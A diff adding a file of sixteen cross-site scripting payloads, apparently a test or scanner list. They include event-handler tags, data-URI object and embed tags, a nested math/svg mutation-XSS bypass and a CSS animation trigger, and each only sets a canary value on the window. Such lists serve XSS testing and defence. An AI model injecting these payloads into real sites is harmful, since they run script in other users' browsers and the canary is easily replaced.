@@ -1,0 +1,16 @@
+<img src=x onerror=window._xss_confirmed='CANARY'>
+<svg onload=window._xss_confirmed='CANARY'>
+<svg/onload=window._xss_confirmed='CANARY'>
+<details open ontoggle=window._xss_confirmed='CANARY'>
+<body onload=window._xss_confirmed='CANARY'>
+<marquee onstart=window._xss_confirmed='CANARY'>
+<video src=x onerror=window._xss_confirmed='CANARY'>
+<audio src=x onerror=window._xss_confirmed='CANARY'>
+<input onfocus=window._xss_confirmed='CANARY' autofocus>
+<iframe srcdoc="<script>parent.window._xss_confirmed='CANARY'</script>">
+<math><mtext><table><mglyph><svg><mtext><textarea><path id=x style="font-family:&quot;><img src=x onerror=window._xss_confirmed='CANARY'>
+<object data="data:text/html,<script>window._xss_confirmed='CANARY'</script>">
+<embed src="data:text/html,<script>window._xss_confirmed='CANARY'</script>">
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=window._xss_confirmed='CANARY'>
+<div id=x tabindex=1 onfocus=window._xss_confirmed='CANARY'></div>
+<script>window._xss_confirmed='CANARY'</script>
